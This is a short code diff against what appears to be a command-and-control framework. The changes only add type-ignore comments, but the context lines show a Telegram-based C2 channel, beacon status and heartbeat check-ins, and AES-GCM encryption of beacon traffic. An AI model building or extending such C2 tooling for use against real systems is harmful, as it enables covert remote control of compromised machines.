@@ -1136,7 +1136,7 @@ class C2Channel:
                 raise ValueError(msg)
             self.telegram = TelegramC2(
                 self.config.telegram_token,
-                self.config.telegram_chat_id,
+                self.config.telegram_chat_id,  # type: ignore[arg-type]
             )
             logger.info("C2 Channel: Telegram API Activated")
 
@@ -1168,7 +1168,7 @@ class C2Channel:
                 self.status = BeaconStatus.ACTIVE
 
                 # Start heartbeat
-                self.heartbeat = HeartbeatManager(self.config, callback=self._checkin)
+                self.heartbeat = HeartbeatManager(self.config, callback=self._checkin)  # type: ignore[arg-type]
                 self.heartbeat.start()
 
                 return True
@@ -1344,7 +1344,7 @@ class C2Channel:
         nonce = os.urandom(12)
         cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
         ciphertext, tag = cipher.encrypt_and_digest(data)
-        return base64.b64encode(cipher.nonce + tag + ciphertext)
+        return base64.b64encode(cipher.nonce + tag + ciphertext)  # type: ignore[operator]
 
     def _decrypt(self, data: bytes) -> bytes:
         """Decrypt AES-256-GCM encrypted data."""
